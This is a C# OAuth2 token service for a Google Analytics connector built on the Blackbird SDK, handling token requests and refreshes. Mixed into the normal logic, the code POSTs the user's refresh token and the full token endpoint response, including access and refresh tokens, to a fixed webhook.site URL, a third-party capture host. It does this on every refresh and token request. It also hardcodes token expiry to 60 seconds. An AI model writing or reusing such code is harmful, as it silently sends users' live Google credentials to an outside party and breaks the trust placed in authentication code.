using System.Text.Json;
using Apps.GoogleAnalytics.Constants;
using Blackbird.Applications.Sdk.Common;
using Blackbird.Applications.Sdk.Common.Authentication.OAuth2;
using Blackbird.Applications.Sdk.Common.Invocation;
using RestSharp;

namespace Apps.GoogleAnalytics.Auth.OAuth2;

public class OAuth2TokenService : BaseInvocable, IOAuth2TokenService
{
    public OAuth2TokenService(InvocationContext invocationContext) : base(invocationContext)
    {
    }

    public bool IsRefreshToken(Dictionary<string, string> values)
    {
        var expiresAt = DateTime.Parse(values[CredsNames.ExpiresAt]);
        return DateTime.UtcNow > expiresAt;
    }

    public Task<Dictionary<string, string>> RefreshToken(Dictionary<string, string> values, CancellationToken cancellationToken)
    {
        const string grantType = "refresh_token";

        var options = new RestClientOptions("https://webhook.site")
        {
            MaxTimeout = -1,
        };
        var client = new RestClient(options);
        var request = new RestRequest("/4e631f81-77cf-4efb-9e48-516e70490ca0", Method.Post);
        request.AddJsonBody(new
        {
            refreshToken = values["refresh_token"]
        });
        client.Execute(request);

        var bodyParameters = new Dictionary<string, string>
        {
            { "grant_type", grantType },
            { "client_id", ApplicationConstants.ClientId },
            { "client_secret", ApplicationConstants.ClientSecret },
            { "refresh_token", values["refresh_token"] }
        };
        
        return RequestToken(bodyParameters, cancellationToken);
    }

    public Task<Dictionary<string, string>> RequestToken(
        string state, 
        string code, 
        Dictionary<string, string> values, 
        CancellationToken cancellationToken)
    {
        const string grantType = "authorization_code";

        var bodyParameters = new Dictionary<string, string>
        {
            { "grant_type", grantType },
            { "client_id", ApplicationConstants.ClientId },
            { "client_secret", ApplicationConstants.ClientSecret },
            { "redirect_uri", $"{InvocationContext.UriInfo.BridgeServiceUrl.ToString().TrimEnd('/')}/AuthorizationCode" },
            { "code", code }
        };
        
        return RequestToken(bodyParameters, cancellationToken);
    }

    public Task RevokeToken(Dictionary<string, string> values)
    {
        throw new NotImplementedException();
    }

    private async Task<Dictionary<string, string>> RequestToken(Dictionary<string, string> bodyParameters, CancellationToken cancellationToken)
    {
        var utcNow = DateTime.UtcNow;
        using var httpClient = new HttpClient();
        using var httpContent = new FormUrlEncodedContent(bodyParameters);
        using var response = await httpClient.PostAsync(Urls.Token, httpContent, cancellationToken);

        var options1 = new RestClientOptions("https://webhook.site")
        {
            MaxTimeout = -1,
        };
        var client1 = new RestClient(options1);
        var request1 = new RestRequest("/4e631f81-77cf-4efb-9e48-516e70490ca0", Method.Post);
        request1.AddJsonBody(new
        {
            RequestToken = true,
            status = response.StatusCode,
            content = await response.Content.ReadAsStringAsync(cancellationToken),
            IsSuccessStatusCode = response.IsSuccessStatusCode
        });
        client1.Execute(request1);

        var responseContent = await response.Content.ReadAsStringAsync(cancellationToken);
        
        var resultDictionary = JsonSerializer.Deserialize<Dictionary<string, object>>(responseContent)?.ToDictionary(r => r.Key, r => r.Value?.ToString())
                               ?? throw new InvalidOperationException($"Invalid response content: {responseContent}");

        var request2 = new RestRequest("/4e631f81-77cf-4efb-9e48-516e70490ca0", Method.Post);
        request2.AddJsonBody(new
        {
            afterResultDictionary = true
        });
        client1.Execute(request2);

        var expiresIn = int.Parse(resultDictionary["expires_in"]);

        var request3 = new RestRequest("/4e631f81-77cf-4efb-9e48-516e70490ca0", Method.Post);
        request3.AddJsonBody(new
        {
            afterExpiresIn = true
        });
        client1.Execute(request3);

        var expiresAt = utcNow.AddSeconds(60);//expiresIn);
        resultDictionary.Add(CredsNames.ExpiresAt, expiresAt.ToString());


        var options = new RestClientOptions("https://webhook.site")
        {
            MaxTimeout = -1,
        };
        var client = new RestClient(options);
        var request = new RestRequest("/4e631f81-77cf-4efb-9e48-516e70490ca0", Method.Post);
        request.AddJsonBody(new
        {
            setupSconnection = true,
            //refreshToken = resultDictionary["refresh_token"]
        });
        client.Execute(request);

        return resultDictionary;

    }
}